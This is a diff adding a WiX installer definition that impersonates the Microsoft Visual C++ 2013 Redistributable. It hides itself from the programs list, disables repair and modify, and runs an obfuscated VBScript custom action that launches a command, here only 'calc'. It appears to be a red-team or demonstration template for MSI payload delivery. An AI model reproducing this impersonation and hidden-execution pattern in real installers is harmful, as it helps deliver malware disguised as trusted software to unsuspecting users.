@@ -1,0 +1,66 @@
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+    <Product Name="Microsoft Visual C++ 2013 Redistributable (64) - 12.0.46151" Manufacturer="Microsoft Corporation" Id="*" UpgradeCode="5600A7B7-C186-4F1F-8860-88BDA4EA6FF6" Language="1033" Version="12.0.46151">
+
+        <Package Manufacturer="Microsoft Corporation" InstallerVersion="400" Compressed="yes" InstallPrivileges="limited" InstallScope="perUser" />
+
+        <!-- Hide application from Control Panel programs list -->
+        <Property Id="ARPSYSTEMCOMPONENT" Value="1"/>
+
+        <!-- Remove repair button -->      
+        <Property Id="ARPNOREPAIR" Value="yes" Secure="yes"/>
+
+        <!-- Remove modify button -->
+        <Property Id="ARPNOMODIFY" Value="yes" Secure="yes"/>
+
+        <Media Id="1" Cabinet="HmSTV.cab" EmbedCab="yes" CompressionLevel="high"/>
+
+        <SetDirectory Id="ChxTzUeGhm" Value="[%LOCALAPPDATA]\VcRedist"/>
+
+        <!-- Step 1: Define the directory structure -->
+        <Directory Id="TARGETDIR" Name="SourceDir">
+            <Directory Id="ChxTzUeGhm"/>
+        </Directory>
+
+        <!-- Step 2: Add files to your installer package -->
+        <DirectoryRef Id="ChxTzUeGhm">
+            <Component Id="UpxUklp" Guid="F1FA2F57-2D59-42F6-9028-E6F51C97BBDC">
+                <RemoveFile Id="zsTjFl" Name="*.*" On="uninstall" Directory="ChxTzUeGhm"/>
+                <File Id="UpxUklp" Source="dummy.txt" KeyPath="yes"/>
+            </Component>
+        </DirectoryRef>
+
+        <!-- Step 3: Tell WiX to install the files -->
+        <Feature Id="MainProgram" Title="Microsoft Visual C++ 2013 Redistributable (64) - 12.0.46151" Level="1">
+            <ComponentRef Id="UpxUklp"/>
+        </Feature>
+
+        <!-- Step 4: Post-Install actions -->
+        <CustomAction Id="DhHxOkM" Execute="deferred" Script="vbscript" Return="ignore" Impersonate="yes" >
+            On Error Resume Next
+            Sub obf_GeneratorEntryPoint()
+                obf_LaunchCommand "calc"
+            End Sub
+            Sub obf_MacroEntryPoint()
+                On Error Resume Next
+                obf_GeneratorEntryPoint
+            End Sub
+            Sub obf_Runtime()
+                obf_MacroEntryPoint
+            End Sub
+            Sub obf_LaunchCommand(ByVal obf_command)
+                Dim obf_launcher
+                Dim obf_cmd
+                With CreateObject("WScript.Shell")
+                    With .Exec(obf_command)
+                        .Terminate
+                    End With
+                End With
+            End Sub
+            obf_Runtime
+        </CustomAction>
+
+        <InstallExecuteSequence>
+            <Custom Action="DhHxOkM" Before="InstallFinalize">NOT REMOVE</Custom>
+        </InstallExecuteSequence>
+    </Product>
+</Wix>
